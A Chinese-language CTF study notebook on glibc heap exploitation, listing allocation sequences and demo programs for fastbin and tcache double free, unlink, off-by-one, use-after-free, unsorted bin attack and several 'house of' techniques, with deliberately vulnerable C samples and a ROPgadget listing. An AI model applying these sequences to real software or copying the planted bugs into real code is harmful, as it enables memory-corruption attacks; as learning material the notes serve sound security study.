## 堆利用序列
## 

### 0x1创建unsorted bin然后释放，重新申请后利用visit函数泄露出Libc地址libc 2.23-2.25(no tcache）

    a=malloc(0x80)
    b=malloc(0x80)
    free(a)
    malloc(0x80)
    visit()
### 0x2创建fast bin，释放后泄露heap baselibc 2.23-2.25(no tcache）

    a=malloc(0x40)
    b=malloc(0x40)
    free(a)
    free(b)
    malloc(0x40)
    visit()
### 0x3fastbin dup free利用序列libc 2.23-2.25(no tcache）

    a = malloc(0x20)
    b = malloc(0x20)
    free(a);
    free(b);
    free(a);
    
    malloc(0x20,addr)
    malloc(0x20)
    malloc(0x20)
    malloc(0x20,data)
### 0x4tcache dup free利用序列libc 2.27(no tcache check）

    a = malloc(0x20);
    
    free(a);
    free(a);
    
    malloc(0x20,addr)
    malloc(0x20)
    malloc(0x20,data)

### 0x5tcache house of spirit 泄露libc地址
tcache基础

    每个tcache链上默认最多包含7个块，再次free这个大小的堆块将会进入其他bin中，例如tcache_attack/libc-leak
    默认情况下，tcache中的单链表个数是64个，64位下可容纳的最大内存块大小是1032（0x408），故只要申请一个size大于0x408的堆块，然后free即可


构造三个堆块绕过free检查，避免unlink出错

    // 在 _int_free 函数中
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
    可以看到free函数对当前的堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的inuse位，这一位的信息在nextchunk的nextchunk中，所以在这里我们总共要伪造三个堆块。第一个堆块我们构造大小为0x500，第二个和第三个分别构造为0x20大小的堆块，这些堆块的标记位，均为只置prev_inuse为1，使得free不去进行合并操作。如图：
    
                            bss
    
    name  +------------> +--------+ +------------+
                         |   0    |
                         +--------+
                         |  0x501 |
    ptr   +------------> +--------+
                         |        |
    free(ptr);           |        |
                         |        |  fake chunk 1
                         |        |
                         |        |
                         |        |
                         |        |
                         |        |
                         |        |
    name + 0x500  +----> +--------+ +------------+
                         |   0    |
                         +--------+
                         |  0x21  |
                         +--------+  fake chunk 2
                         |   0    |
                         +--------+
                         |   0    |
                         +--------+ +------------+
                         |   0    |
                         +--------+
                         |  0x21  |
                         +--------+  fake chunk 3
                         |   0    |
                         +--------+
                         |   0    |
                         +--------+ +------------+

### 0x6 off-by-null（no tcache）
demo,strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 '\x00' 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 '\x00' 

    int main(void)
    {
        char buffer[40]="";
        void *chunk1;
        chunk1=malloc(24);
        puts("Get Input");
        gets(buffer);
        if(strlen(buffer)==24)
        {
            strcpy(chunk1,buffer);
        }
        return 0;
    
    }
利用序列

参考0x7 off-by-one overwrite NULL byte 

### 0x7 off-by-one（no tcache）
常见的read时使用<=，没使用<导致越界1字节写
    int my_gets(char *ptr,int size)
    {
        int i;
        for(i=0;i<=size;i++)
        {
            ptr[i]=getchar();
        }
        return i;
    }
    int main()
    {
        void *chunk1,*chunk2;
        chunk1=malloc(16);
        chunk2=malloc(16);
        puts("Get Input:");
        my_gets(chunk1,16);
        return 0;
    }
利用序列
http://d0m021ng.github.io/2017/03/01/PWN/Linux%E5%A0%86%E6%BC%8F%E6%B4%9E%E4%B9%8Boff-by-one/

#### （1）利用unlink机制

Small bin unlink: 

    参考0x10
    利用方式已经在Linux堆漏洞之Double-free中介绍过，虽然是不同的漏洞，但是主要利用原理还是类似的，就不介绍了。

Large bin unlink: 

    利用方式在glibc 2.20版之后已经失效，但还是有必要介绍一下其中一些思路。该攻击最早出现在2014年Google Project Zero项目的一篇文章中The poisoned NUL byte, 2014 edition。在Linux堆漏洞之Double-free中已经讲过unlink宏，其中只讲到unlink Small bin时进行的操作，只需绕过第一层双向循环链表检查就可以利用unlink。如果unlink Large bin，由于Large bin块含有字段fd_nextsize和bk_nextsize，在绕过第一层双向循环链表检查还会进行第二次双向循环链表检查。但是在glibc早期版本(2.19之前)，第二次双向循环链表检查只通过断言(assert)形式，属于调试信息，不能真正的对漏洞进行有效的防护。从而可以利用Large bin unlink导致一次任意地址写，然后利用overwriting tls_dtor_list实现漏洞利用。在程序main()函数结束调用exit()函数时，会遍历tls_dtor_list调用一些处理收尾工作的函数，如果通过overwriting tls_dtor_list使其指向伪造的tls_dtor_list，就可以调用自己的函数（如system(‘/bin/sh’)）。在当前版本的glibc(2.23)中，unlink宏在unlink Large bin 时会进行双向链表检查，而且在__call_dtors_list中获取tls_dtor_list时也做了一些限制，导致很难利用Large bin unlink。 Overwriting tls_dtor_list是一个很好的利用点，但是目前我还没有找到如何利用。

#### （2）利用堆块覆盖
off-by-one overwrite freed or allocated : 

    如图1所示，堆块A、B、C，其中堆块A已分配且含有off-by-one漏洞，堆块B已释放，堆块C为目标堆块，需要对堆块C可读写。可以通过堆块A的off-by-one漏洞覆盖堆块B size字段的最低字节（不改变inuse位），使堆块B的长度可以包含堆块C。然后在malloc(B+C)，就可以获取堆块B的原来指针，从而可以对目标堆块进行读写。
    A=malloc(0x58)
    B=malloc(0x58)
    C=malloc(0x58)
    A+0x59(B.size)=0xC0
    free(B)
    D=malloc(0xb0)
    D 包含了 (B+C)，可用进一步泄露libc、堆地址？修改chunk fd或者bk
    如果堆块A、B、C都是已分配，可以释放掉堆块B，将问题转化为前面一种情况，同样可以解决。
    
          _____________________                          ______|_____B_______|______
         |      |      |       |                        |      |    |    |   |     |
         |  A   |   B  |   C   |                        |  A   | B1 | B2 |   | C   |
         |______|______|_______|                        |______|____|____|___|_____|
    图1  overwrite freed or allocated                      图2  overwrite null byte
off-by-one overwrite NULL byte : 

    这类漏洞在实际中很常见，如使用strcpy()进行复制时未考虑字符串长度。如图2所示，堆块A、B、C，其中堆块A已分配且含有off-by-one漏洞，堆块B、C已分配，堆块B2为目标堆块，需要对堆块B2可读写。利用方法：先释放掉堆块B，然后通过堆块A的off-by-one漏洞覆盖堆块B size字段的最低字节为NULL，减小堆块B的size字段值 （如果堆块B size字段未改变，再次分配时，堆块C的prev_size字段会改变，造成漏洞无法利用） ；再申请两个较小的堆块B1和B2(B1+B2<B)，这时堆块C的prev_size大小仍然是堆块B的大小，释放掉堆块B1和堆块C时就会导致堆块B和堆块C进行合并，然后再malloc(B+C)大小的堆块就可以得到原来堆块B的地址，从而可以对堆块B2进行读写。
    A=malloc(0x108)
    B=malloc(0x108)
    C=malloc(0x108)
    free(B)
    A+0x109(B.size last byte)=0x00  #减小B堆块SIZE，从0x110->0x100
    B1=malloc(0x58)
    B2=malloc(0x28)
    free(B1)
    free(C)
    D=malloc(0x220) #malloc(B+C), D的数据段包含了B2 chunk，可用进一步泄露libc、堆地址？修改chunk fd或者bk
    
    #include <stdio.h>
    #include <string.h>
    #include <malloc.h>
    
    int main(int argc, char* argv[])
    {
        void *A,*B,*C;
        void *B1,*B2;
        void *Overlapping;
        A = malloc(0x100-8);
        B = malloc(0x200);
        C = malloc(0x100);
        printf("chunk B address: %x,  C address: %x\n", B, C);
    
        free(B);
        ((char *)A)[0x100 - 8] = '\x00';    // off-by-one NULL byte
    
        B1=malloc(0x100);
        B2=malloc(0x80);
        printf("chunk B1 address: %x,  B2 address: %x\n", B1, B2);
        free(B1);
        free(C);
        Overlapping = malloc(0x300);  
        printf("new malloced chunk: %x\n", Overlapping);
        return 0;
    }
    
    2.28检查
    /* consolidate backward */
        if (!prev_inuse(p)) {
          prevsize = prev_size (p);
          size += prevsize;
          p = chunk_at_offset(p, -((long) prevsize));
          /* 后两行代码在最新版本中加入，off-by-one overwrite NULL byte方法无法使用，但是 2.28 及之前都没有问题，off-by-one overwrite NULL byte利用方法无法修改pre chunk的size，但是构造fake chunk unlink通过构造假SIZE可以绕过这个检查的，所以可以继续使用 */
          if (__glibc_unlikely (chunksize(p) != prevsize))
            malloc_printerr ("corrupted size vs. prev_size while consolidating");
          unlink_chunk (av, p);
        }

### 0x8 unlink
malloc.c int_free函数 unlink机制介绍

    /* Treat space at ptr + offset as a chunk */
    #define chunk_at_offset(p, s)  ((mchunkptr) (((char \*) (p)) + (s)))
    /* check/set/clear inuse bits in known places */
    #define inuse_bit_at_offset(p, s)					      \
      (((mchunkptr) (((char \*) (p)) + (s)))->size & PREV_INUSE)
    
    _int_free (mstate av, mchunkptr p, int have_lock)
    {
          ...
          /* consolidate backward \*/                    // "向后合并"
         if (!prev_inuse(p)) {                           //如果前一个块为空闲，则进行合并
           prevsize = p->prev_size;                      //获得前一个块大小
           size += prevsize;                             //合并后堆块大小
           p = chunk_at_offset(p, -((long) prevsize));   //根据当前块指针和前一个块大小，确定前一个块位置，即合并后块位置
           unlink(av, p, bck, fwd);                      //利用unlink从显式链表Unsorted bin取下前一个块
          }
    
          nextchunk = chunk_at_offset(p, size);                 //根据当前块指针和当前块大小， 确定后一个块位置，
          nextsize = chunksize(nextchunk);                      //获得后一个块大小
          nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //根据下一个块的下一个块的PREV_INUSE位，判断下一个块是否空闲
          /* consolidate forward \*/                // "向前合并"
         if (!nextinuse) {                          //如果后一个块为空闲，则进行合并
           unlink(av, nextchunk, bck, fwd);         //使用unlink将后一个块从unsorted bin中取下
           size += nextsize;                        //扩大当前块大小即可完成向前合并
         } else
         clear_inuse_bit_at_offset(nextchunk, 0);
         ...
    }
    
      unlink 宏中主要的操作如下:
      注意：此处的fd、bk指的是显式链表bins中的前一个块和后一个块，与合并块时的隐式链表中的前一个块和后一个块不同
      #define unlink(AV, P, BK, FD) {                                            
          FD = P->fd;   //获取显式链表中前一个块 FD					      
          BK = P->bk;   //获取显示链表中后一个块 BK              
          FD->bk = BK;  //设置FD的后一个块					      
          BK->fd = FD;  //设置BK的前一个块
      }
    
      //由于unlink的危险性，添加了一些检测机制，完整版unlink宏如下
      /* Take a chunk off a bin list */
      #define unlink(AV, P, BK, FD) {                                            \
          FD = P->fd;								      \
          BK = P->bk;								      
          if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \ 
            malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
          else {								      \
              FD->bk = BK;							      \
              BK->fd = FD;							      \
              if (!in_smallbin_range (P->size)				      \
                  &&__builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
            || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr (check_action,				      \
                       "corrupted double-linked list (not small)",    \
                       P, AV);					      \
                  if (FD->fd_nextsize == NULL) {				      \
                      if (P->fd_nextsize == P)				      \
                        FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                      else {							      \
                          FD->fd_nextsize = P->fd_nextsize;			      \
                          FD->bk_nextsize = P->bk_nextsize;			      \
                          P->fd_nextsize->bk_nextsize = FD;			      \
                          P->bk_nextsize->fd_nextsize = FD;			      \
                        }							      \
                    } else {							      \
                      P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                      P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
                    }								      \
                }								      \
            }									      \
      }

利用序列
fake chunk 1

    利用结果，将一个fakechunk释放到bins链表中，可以控制fd\bk，泄露libc地址，控制fd,bk指向
    fakechunk_ptr->	---------------------------
                    presize
                    size
                    fd           fakechunk_ptr
                    bk           fakechunk_ptr

fake chunk 2

    条件 
    UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针
    已知位置存在一个指针指向可进行 UAF 的 chunk
    效果 
    使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18
    思路 
    设指向可 UAF chunk 的指针的地址为 ptr
    修改 fd 为 ptr - 0x18
    修改 bk 为 ptr - 0x10
    触发 unlink
    ptr 处的指针会变为 ptr - 0x18。
    
    *targer_ptr(可能是BSS段的一个地址)=stack(假设)
    fakechunk_ptr->	---------------------------
                    presize
                    size
                    fd           targer_ptr-0x18
                    bk           targer_ptr-0x10
    unlink后
    *targer_ptr=targer_ptr-0x18


### 0x9 use after free

    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    
    typedef struct string {
        unsigned length;
        char *data;
    } string;
    
    int main() {
        struct string* s = malloc(sizeof(string));
        puts("Length:");
        scanf("%u", &s->length);
        s->data = malloc(s->length + 1);
        memset(s->data, 0, s->length + 1);
        puts("Data:");
        read(0, s->data, s->length);
    
        free(s->data);
        free(s);
    
        char *s2 = malloc(16);
        memset(s2, 0, 16);
        puts("More data:");
        read(0, s2, 15);
    
        // Now using s again, a UAF
    
        puts(s->data);
    
        return 0;
    }
利用序列
	
	A=malloc(0x20)
	B=malloc(0x20)
	A[0]=B
	free(A)
	C=malloc(0X20)
	C[0]=got_addr 此时C==A, B指针位置等于got表地址
	edit(A[0], content)  use after free A,content换位onegaget即可getshell
### 0x10 off-by-null unlink利用（libc2.23 libc2.27 libc2.29）

https://www.anquanke.com/post/id/208407
libc2.27利用：

    1. 现在有 Chunk_0、Chunk_1、Chunk_2、Chunk_3。
    2. 释放 Chunk_0 ，此时将会在 Chunk_1 的 prev_size 域留下 Chunk_0 的大小
    3. 在 Chunk_1 处触发Off-by-null，篡改 Chunk_2 的 prev_size 域以及 prev_inuse位
    4. Glibc 通过 Chunk_2 的 prev_size 域找到空闲的 Chunk_0 
    5. 将 Chunk_0 进行 Unlink 操作，通过  Chunk_0 的 size 域找到 nextchunk 就是 Chunk_1 ，检查 Chunk_0 的 size 与 Chunk_1 的 prev_size 是否相等。
    6. 由于第二步中已经在 Chunk_1 的 prev_size 域留下了 Chunk_0 的大小，因此，检查通过。
    A=malloc(0x108)
    B=malloc(0x108)
    C=malloc(0x108)
    D=malloc(0x108)
    free(A)
    B+0x109(C.size last byte)=0x00  #减小C堆块SIZE，从0x110->0x100
    B+0x100(C.presize )=0x220 
    free(C)
    E=malloc(0x330) #malloc(A+B+C), E的数据段包含了B，可用进一步泄露libc、堆地址？修改chunk fd或者bk

libc2.29没法直接利用， 只能构造假chunk

### 0x11 largebin attack
https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/

https://www.freebuf.com/articles/system/232676.html

largebin 申请时利用

largebin 释放时利用

### 0x12 house of orange
2.26以及以上没使用_IO_flush_all_lockp，2.24增加了vtable检查没法继续使用
House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。
然后修改io_list_all地址到top chunk，topchunk中放好fake file，最后触发，获取shell，参考https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c



### 0x13 house of force
控制TOP CHUNK SIZE得到任意地址分配，利用前提：
能够以溢出等方式控制到 top chunk 的 size 域
能够自由地控制堆分配尺寸的大小

### 0x14 house_of_spirit
构造fake chunk后free到bins中的一种技术，可以泄漏libc地址，控制fake chunk地址空间

    #include <stdio.h>
    #include <stdlib.h>
    
    int main()
    {
        fprintf(stderr, "This file demonstrates the house of spirit attack.\n");
    
        fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
        malloc(1);
    
        fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
        unsigned long long *a;
        // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
        unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
    
        fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[9]);
    
        fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
        fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
        fake_chunks[1] = 0x40; // this is the size
    
        fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
            // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
        fake_chunks[9] = 0x1234; // nextsize
    
        fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
        fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
        a = &fake_chunks[2];
    
        fprintf(stderr, "Freeing the overwritten pointer.\n");
        free(a);
    
        fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
        fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
    }

free fastbin检查比较少，参考上文how2heap
free unsorted bin检查比较多

	构造三个堆块绕过free检查，避免unlink出错
	// 在 _int_free 函数中
	if (nextchunk != av->top) {
	  /* get and clear inuse bit */
	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
	可以看到free函数对当前的堆块的nextchunk也进行了相应的检查，并且还检查了nextchunk的inuse位，这一位的信息在nextchunk的nextchunk中，所以在这里我们总共要伪造三个堆块。第一个堆块我们构造大小为0x500，第二个和第三个分别构造为0x20大小的堆块，这些堆块的标记位，均为只置prev_inuse为1，使得free不去进行合并操作。如图：
	
	                        bss
	
	name  +------------> +--------+ +------------+
	                     |   0    |
	                     +--------+
	                     |  0x501 |
	ptr   +------------> +--------+
	                     |        |
	free(ptr);           |        |
	                     |        |  fake chunk 1
	                     |        |
	                     |        |
	                     |        |
	                     |        |
	                     |        |
	                     |        |
	name + 0x500  +----> +--------+ +------------+
	                     |   0    |
	                     +--------+
	                     |  0x21  |
	                     +--------+  fake chunk 2
	                     |   0    |
	                     +--------+
	                     |   0    |
	                     +--------+ +------------+
	                     |   0    |
	                     +--------+
	                     |  0x21  |
	                     +--------+  fake chunk 3
	                     |   0    |
	                     +--------+
	                     |   0    |
	                     +--------+ +------------+

### 0x15 chunk extend and overlapping

### 0x16 seccomp
https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
参考wiki
可以修改chunk size时，通过inuse fastbin， inuse smallbin，free smallbin
以及通过pre_size unlink产生overlapping

一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制chunk中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。

此外通过extend可以实现chunk overlapping，通过overlapping可以控制chunk的fd/bk指针从而可以实现 fastbin attack 等利用。
### 0x17 unsorted bin attack
修改target addr 内容
利用序列

	unsigned long target_var = 0;
	unsigned long *p = malloc(400);
	malloc(500); 避免和top chunk合并
	free(p);
	p[1] = (unsigned long)(&target_var - 2);
	malloc(400);  触发漏洞 此时target_var（相当于fd）变为main_arena中Unsorted bin头的地址

可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。

即修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。
We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78
Now emulating a vulnerability that can overwrite the victim->bk pointer
And we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508

Let's malloc again to get the chunk we just free. During this time, target should has already been rewrite:
0x7ffe0d232518: 0x7f1c705ffb78
这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。而且，需要注意的是，

这看起来似乎并没有什么用处，但是其实还是有点卵用的，比如说

    我们通过修改循环的次数来使得程序可以执行多次循环。
    我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack了。

### 0x17 glibc 2.24 以上 IO_FILE 的利用（小于等于2.27）
#### (1)_IO_str_jumps -> overflow

#### (2)_IO_str_jumps -> finish

### 0x18  House Of Einherjar 
该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。其主要在于滥用 free 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。

    两个物理相邻的 chunk 会共享 prev_size字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过写低地址 chunk 覆盖高地址 chunk 的 prev_size 字段。
    一个 chunk PREV_INUSE 位标记了其物理相邻的低地址 chunk 的使用状态，而且该位是和 prev_size 物理相邻的。
    后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize)) 。
    那么如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。

### 0x19  House Of botcake 
绕过tcache double free检查，达到tcache poisoning效果
https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
利用序列

      填满tcahce
      intptr_t *x[7];
        for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++){
            x[i] = malloc(0x100);
        }
        intptr_t *prev = malloc(0x100);
        intptr_t *a = malloc(0x100);
        malloc(0x10);方式合并到top chunk
        for(int i=0; i<7; i++){
                free(x[i]);
            }
        free(a); 释放到Unsorted bin
        free(prev); 触发chunk 合并，形成大chunk
        malloc(0x100);
        free(a);// a is already freed， 此时释放到tcache
        intptr_t *b = malloc(0x120);
        b[0x120/8-2] = (long)stack_var;  //修改tcache chunk fd
        malloc(0x100); 申请得到 a
        intptr_t *c = malloc(0x100); 申请得到stack chunk

## 知识点
### 0x1 fastbin索引计算

    0x7f经过如下运算是会得到fastbin的索引为5，
    # define fastbin_index(sz)                                                      \
        ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
### 0x2 malloc hook one_gadget不满足约束解决

	free(a)
	free(a)->dubble free->malloc
	通过两次free同一个chunk触发doublefree的error，这个error字符串的打印最终用到malloc，这个调用malloc的途径满足第三个one_gadget的约束。
### 0x3 fastbin_dup_consolidate
    #include <stdio.h>
    #include <stdint.h>
    #include <stdlib.h>
    
    int main() {
      void* p1 = malloc(0x40);
      void* p2 = malloc(0x40);
      fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
      fprintf(stderr, "Now free p1!\n");
      free(p1);
    
      void* p3 = malloc(0x400);
      fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
      fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
      free(p1);
      fprintf(stderr, "Trigger the double free vulnerability!\n");
      fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
      fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
    }


    void* p1 = malloc(0x40);
    void* p2 = malloc(0x40);
    free(p1);
    void* p3 = malloc(0x400); #触发malloc_consolidate fastbin 进入small bin
    free(p1); 进入fastbin，不会报错
0x4 libc tcache指针保存

    tcache在libc中以线程本地变量的形式保存，位于libc下面的段中（一般和libc的偏移固定），可以通过修改tcache内容劫持tcache分配
    可以通过
    （1）在malloc中打断点
    （2）search -p heap_ptr+0x10
    找到这个地址的位置

### 0x4 _do_global_dtors_aux中有一个gadgets可以修改stack上的数据，以达到可以代替64位的ret2_dl_runtime_resolve

bash
root@--name:/ctf/work/eonew/noleak# ROPgadget --binary no_leak | grep rbp
0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret
0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret
0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
0x00000000004004a9 : je 0x4004c0 ; pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004004eb : je 0x400500 ; pop rbp ; mov edi, 0x601010 ; jmp rax
0x0000000000400512 : mov byte ptr [rip + 0x200af7], 1 ; pop rbp ; ret
0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret
0x0000000000400515 : or ah, byte ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004004ab : pop rbp ; mov edi, 0x601010 ; jmp rax
0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004004b8 : pop rbp ; ret

0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret 这个gadget位于

_do_global_dtors_aux中 只要控制rbp和edx的值就可以任意修改栈上的数据
